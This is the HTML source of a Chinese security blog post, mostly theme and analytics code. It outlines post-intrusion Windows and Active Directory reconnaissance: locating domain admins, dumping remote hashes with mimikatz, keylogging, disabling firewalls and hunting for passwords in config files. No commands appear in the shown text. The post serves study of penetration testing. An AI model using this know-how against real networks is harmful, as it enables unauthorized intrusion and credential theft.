<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>内网渗透学习-Windows信息搜集篇-持续更新 | hybcx</title><meta name="keywords" content="内网渗透"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="内网渗透学习-Windows信息搜集篇-持续更新"><meta name="application-name" content="内网渗透学习-Windows信息搜集篇-持续更新"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="内网渗透学习-Windows信息搜集篇-持续更新"><meta property="og:url" content="http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。 判断机器所处于网络拓扑哪个区域，是在DMZ区、办公区、核心区。区域界限是相对的 0x01 机器角色判断  文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机 DNS服务器"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。 判断机器所处于网络拓扑哪个区域，是在DMZ区、办公区、核心区。区域界限是相对的 0x01 机器角色判断  文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机 DNS服务器"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/09/03/nei-wang-shen-tou-xue-xi-windows-xin-xi-sou-ji-pian/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '内网渗透学习-Windows信息搜集篇-持续更新',
  postAI: '',
  pageFillDescription: '0x01 机器角色判断, 0x02 本机信息收集, 2.1 查看主机名, 2.2 查看版本, 2.3 查看所有环境变量, 2.4 查看安装驱动, 2.5 查看操作系统信息, 2.5.1 架构, 2.5.2 系统名, 2.6 查看逻辑盘, 2.7 本机网络配置, 2.8 查看当前系统版本, tip：wmic命令, 2.9 查看体系结构, 2.10 查询操作系统及软件信息, 2.11  framework版本, 2.12 查看补丁列表, 2.13 查看补丁的名称、描述、ID、安装时间等, 2.14 PowerShell收集软件的版本信息, 2.15 查看安装的软件的版本、路径等, 2.16 查看当前用户权限, 2.17 查询本机服务信息, 2.18 查看开启的服务, 2.19 wmic查询进程信息, 2.20 查看进程, 2.21 查看启动程序信息, 2.22 查看计划任务(需要高权限), 2.23 查看主机开机时间, 2.24 查看本机用户列表, 2.25 获取本地管理员信息, 2.26 查看当前在线用户, 2.27 查看在线用户, 2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限), 2.29 查询端口列表, 2.30 查看本机共享列表和可访问的域共享列表, 2.31 查找共享列表, 2.32 磁盘映射, 2.33 查询路由表, 2.34 查看远程连接信息, 2.35 查看杀软, 2.36 查看本地密码策略, 2.37 查看hosts文件：, 2.38 查看dns缓存, 2.39 常见查毒软件进程, 2.40 浏览器信息收集, 0x03 域环境信息收集, 3.1 判断是否存在域, 3.2 解析域名ip, 3.3 查看当前权限, 3.4 获取域SID, 3.5 查询指定用户的详情信息, 3.6 查看域内所有账号, 3.7 对比查看域(域名)和登录服务器(域控制器)的信息是否匹配, 3.8 对比查看工作站域DNS名称(域名)和登录域(域控制器)的信息是否相匹配, 3.9 查看时间可以找到域控, 3.10 查看域密码策略, 3.11 查看当前登录域, 3.12 登录本机的域管理员, 3.13 获取域控ip, 3.14 查询域, 3.15 查询域内的所有计算机, 3.16 查询域的所有组（enterprise admins组权限最大）, 3.17 SPN扫描, 3.18 查看域管理员的用户组, 3.19 查询域系统管理员用户组, 3.20 查看域控制器, 3.21 查看域控制器的机器名, 3.22 查看dns缓存, 3.23 列域控c盘文件(需要域管理员权限), 3.24 查询所有域成员计算机列表, 3.25 获取域信任信息, 3.26 获取域内用户的详细信息, 3.27 查看存在的用户, 3.28 查询所有计算机名称, 3.29 攻击主机CMD扫描同网段存活ip, 3.30 PowerView.ps域内信息收集, 3.31 cs信息收集, target组信息的命令, 获取远程目录, cs通过powershell命令获取目录信息, cs通过mimikatz抓取远程哈希值, 3.32 防火墙相关, 3.33 查询代理配置情况, 3.34 查询并开启远程连接服务, 3.35 端口扫描, 1. telnet端口连接, 2. PowerSploit 中的Invoke-portscan.ps1脚本, 3. Nishang中的Invoke-portscan.ps1, 4. Nmap扫描, 5. Metasploit 端口扫描模块, 6. 收集域内端口的banner信息, 获取Banner, 7. 使用Nmap获取banner, 8. 使用nc获取banner, 3.36 存活主机扫描, nbtscan, ping, arp-scan.exe, 批处理脚本, msf主机存活扫描, 3.37 定位域管理员, psloggeddon.exe, PVEFindADUser.exe, powerview.ps1, 3.38 Empire信息收集, 3.39 powersploit 信息收集, 3.40 翻翻配置文件, 3.41 BloodHound域分析工具, 配置, 3.42 使用empire收集信息, 四、参考文章：当我们通过渗透进入内网环境后面对的是一片未知区域需要对当前机器角色判断对机器所处区域分析判断机器所处于网络拓扑哪个区域是在区办公区核心区区域界限是相对的机器角色判断文件服务器配合社工生成捆绑到文件服务器公用文件上可批量上线主机服务器端口可通过服务器获取内网系统信息或者探测域信息服务器查看内网多组网段信息更多的获取拓补信息开发测试服务器获取源码新的信息资产多存在弱口令代理服务器获取服务器账号拿到各种密码服务器可能需要提权一般接触到的环境个人查看是否存在域环境本机信息收集包括操作系统权限内网段杀软端口服务补丁情况网络连接共享会话等如果是域内主机那么操作系统应用软件补丁服务杀软一般都是批量安装的文件共享连接记录浏览器访问记录连接记录连接记录如果由于使用了的无法使用命令需要在命令前加上这样就能执行的命令了查看主机名查看版本查看所有环境变量查看安装驱动查看操作系统信息架构系统名查看逻辑盘本机网络配置地址信息端口信息记录信息查看当前系统版本命令顺便了解一下命令作用是操作系统中的一个命令行实用程序用于执行各种系统管理任务和查询系统信息通过用户可以在命令行中执行各种操作包括查询系统信息管理进程服务网络设置等提供了丰富的命令查看体系结构查询操作系统及软件信息英文系统名称版本中文系统这里不知为何打不开找了几篇文章感觉是环境变量的问题设置了之后又发现语法错误双引号是中文版的好在最后成功了且为中文系统查看版本查看补丁列表查看补丁的名称描述安装时间等收集软件的版本信息查看安装的软件的版本路径等查看软件比较靠谱的做法是远程加载本地文件中可以使用上传后输入将文件放到靶机本地加载也可以这里尝试了半天不知道从哪下手还是对不熟悉之后深入学习慢慢搞查看当前用户权限查询本机服务信息查看开启的服务查询进程信息查看进程查看启动程序信息查看计划任务需要高权限之前之后查看主机开机时间查看本机用户列表获取本地管理员信息查看当前在线用户查看在线用户列出断开本地计算机与所连接的客户端的对话需要高权限查询端口列表查看本机共享列表和可访问的域共享列表端口查找共享列表磁盘映射这里不太懂没搞出来查询路由表可用接口的缓存表局域网内查看是否有重复的地址判断是否存在欺骗服务器绑定地址方式防止欺骗查看远程连接信息查看杀软暂时没有查看本地密码策略查看文件查看缓存列举安装的软件项目地址自动信息收集我们可使用自动化脚本管理工具命令行在默认情况下任何版本的的低权限用户不能访问以上版本的低权限用户允许访问并执行相关操作执行后会将信息收集的结果写入文档项目地址获取主机信息也可以用项目地址需要编译放到靶机上执行下列命令最好先免杀一下不然会一直警告上的插件也有集成可以直接使用插件这里等学了免杀在搞吧常见查毒软件进程随后将结果放到中对比查看进程软件名称杀毒实时保护主动防御金山卫士服务器安全狗迈克菲杀毒软件卡巴斯基小红伞可以用自动判断项目地址浏览器信息收集项目地址域环境信息收集判断是否存在域可查看网关地址的地址域名本机是否和服务器处在同一网段等解析域名通过反向解析查询命令来解析域名的地址用解析到的地址进行对比判断域控服务器和服务器是否在同一台机器上这里写自己的域控制服务器域名查看当前权限获取域查询指定用户的详情信息查看域内所有账号对比查看域域名和登录服务器域控制器的信息是否匹配域名域控制器对比查看工作站域名称域名和登录域域控制器的信息是否相匹配查看时间可以找到域控查看域密码策略查看当前登录域登录本机的域管理员获取域控查询域查询域内的所有计算机查询域的所有组组权限最大扫描这里我估计应该是没有吧查看域管理员的用户组查询域系统管理员用户组查看域控制器查看域控制器的机器名查看缓存列域控盘文件需要域管理员权限这里不知为何我找不到指定的文件或许是命令错误找了半天发现是域名前面应该是两条反斜杠查询所有域成员计算机列表获取域信任信息获取域内用户的详细信息查看存在的用户这条命令只能在服务器才能使用查询所有计算机名称攻击主机扫描同网段存活扫段扫段域内信息收集查域内环境查共享目录查看域内信任关系主机名查看指定用户的登录时间所属组情况信息收集组信息的命令组名获取远程目录递归获取多级目录及文件通过命令获取目录信息通过抓取远程哈希值防火墙相关关闭防火墙及之前的版本之后的版本查看防火墙配置修改防火墙配置及之前的版本允许指定程序全部连接之后的版本情况如下允许指定程序进入允许指定程序退出允许端口放行自定义防火墙日志的储存位置查询代理配置情况查询并开启远程连接服务查看远程连接端口转换后就是在中开启端口在和中开启端口端口扫描端口连接没有开启的话去打开或关闭功能开启只用于确认端口是否开启用不拿来端口扫描主机端口中的脚本下载地址端口扫描利用到工具包中的或者扫描全部的端口中的下载地址该脚本可用于发现主机解析主机名扫描端口解析主机名扫描一般通过挂代理远程扫描内网渗透测试隐藏通讯隧道技术端口扫描模块中提供了很多内置的扫描模块使用方便在侵入内网后设置好路由直接扫即可有时速度有些慢几个常用的收集域内端口的信息信息表示欢迎语其中会包含一些敏感信息在信息中可以获取到软件开发商软件名称服务类型版本号等而版本号信息有时会存在公开的可以利用获取到版本号后可以在中查找到对应的编号并在等平台上面找到相关的利用方式获取扫描到端口后就要获取到其信息接着就可以在漏洞库里查找这个可以找一下常见的端口的服务来得知端口号端口说明攻击技巧文件传输协议允许匿名上传下载爆破嗅探溢出和后门远程连接爆破个退格远程连接爆破嗅探弱口令邮件服务邮件伪造域名系统区域传输劫持缓存投毒欺骗利用隧道技术刺透防火墙劫持欺骗常见服务端口攻击爆破对应服务器版本漏洞爆破嗅探爆破未授权访问远程代码执行爆破爆破目录访问协议注入攻击未授权访问弱口令直接使用爆破未授权访问文件上传爆破进行内网渗透邮件服务爆破弱口令信息泄漏源代码爆破使用系统用户登录注入攻击弱口令爆破注入攻击反弹配置不当未授权访问爆破拒绝服务注入提权爆破后门服务泄露未授权访问爆破控制台弱口令认证绕过爆破注入缓冲区溢出注入攻击爆破弱口令拒绝服务代码执行抓取密码爆破弱口令认证绕过未授权访问爆破弱口令反序列化控制台弱口令控制台部署远程命令执行注入反序列化控制台弱口令控制台爆破控制台弱口令反序列远程代码执行控制面板弱口令未授权访问爆破未授权访问远程执行使用获取地址端口端口范围我这里没就借用图片了使用获取地址端口存活主机扫描是一个命令行工具用于扫描本地或远程网络上的开放名称服务器下载地址将上传到目标主机上然后直接输入段即可运行扫描扫描一个网段扫描两个网段参数解释该主机存在正在运行的文件和打印共享服务该机器可能是域控制器没有识别处该机器的资源基于扫描内网兼容扫段基于协议来进行存活性扫描项目地址这个工具的速度比上一个快很多批处理脚本这个批处理文件可用于对内网工作组和域内存活主机进行简单的扫描探测并且支持中英文操作系统命令成功完成命令成功完成正常終了主机存活扫描建立会话拿到即可直接执行命令至今进行信息收集也可以进行直接执行可以一键收集记录定位域管理员下载地址可以查看本地登陆的用户和通过本地计算机或远程计算机资源登陆的用户如果指定的是用户名而不是机器名会搜索网上邻居中的所有计算机并显示该用户是否已经登录该工具的某些功能需要管理员权限或查看域控登录过的机器查看本地登录的用户查看指定用户登录的计算机下载地址可用于查找活动目录用户登陆的位置枚举域用户以及查找在特定计算机上登陆的用户包括查找本地用户通过远程桌面登陆的用户通过运行服务和计划任务的用户运行该工具需要计算机配置环境并需要有管理员权限参数我们一般直接运行命令即可显示域中所有计算机上当前登陆的所有用户显示指定用户登录的计算机如果仅指定了参数将获取目标计算机上当前登录的所有用户如果指定了用户名则显示该用户登陆的计算机脚本可以用来获取当前域管理员在线登录的服务器其依赖和在工具包中是一个收集域信息很好用的脚本搜索本地域中域管理员当前在线的主机并验证当前用户是否具有对这些主机的本地管理员访问权限它可以使用和扫描每台服务器并对扫描结果进行比较从而找出目标用户集并且无需管理员权限如下可以看到本地域有一个域管理员我们通过等于来定位他们详情请执行命令查看具体使用方法与前两个相似它可以找到域内特定的用户群接受用户名用户列表和域组列表查询接受一个主机列表或查询可用的主机域名一切都是灵活的让你自己定义找寻谁在哪里找获取指定用户在线机器信息收集查看本机用户域组成员密码设置时间剪贴板内容系统基本信息网络适配器信息共享信息等目标主机事件日志应用程序控制策略日志登录信息脚本运行和保存的信息等需要管理员权限信息收集项目地址已经停止维护建立会话后的加载模块调用本地脚本命令执行获取当前的域名称返回所有域内成员的详细信息获取所有的域内的控制器信息获取所有域内机器的名称获取域内的所有的网络共享获取指定服务的远程连接信息获取进程的详细信息获取活动目录的信息判断用户是否登陆计算机且用户是否有管理员权限无文件攻击将下载的文件放在上面确保目标服务器可以访问如在目标机导入脚本扫描网段端口抓取导键盘记录将键盘记录保存到里面翻翻配置文件一个正常的应用肯定有对应的数据库账号密码信息可以使用如下命令寻找包含密码字段的文件目录表示正则表示遍历子目录表示不显示匹配查文件应用目录应用目录敏感路径常用应用的默认配置路径还有一些系列产品的密码查看项目域分析工具通过图与线的形式将域内用户计算机及相关用户等等之间的关系直观地展现在队员面前帮助更快的梳理域内的情况这里先做了解基于非关系型数据库配置安装安装开启服务这里发现有点问题就先放弃了留个标记等日后需要拾起域分析工具使用教程使用收集信息在攻击机上安装后使用即可收集相关信息注意使用该模块需要拿到管理员权限四参考文章内网渗透信息收集篇内网渗透初识信息收集内网渗透初识信息收集',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-09-10 11:37:13',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 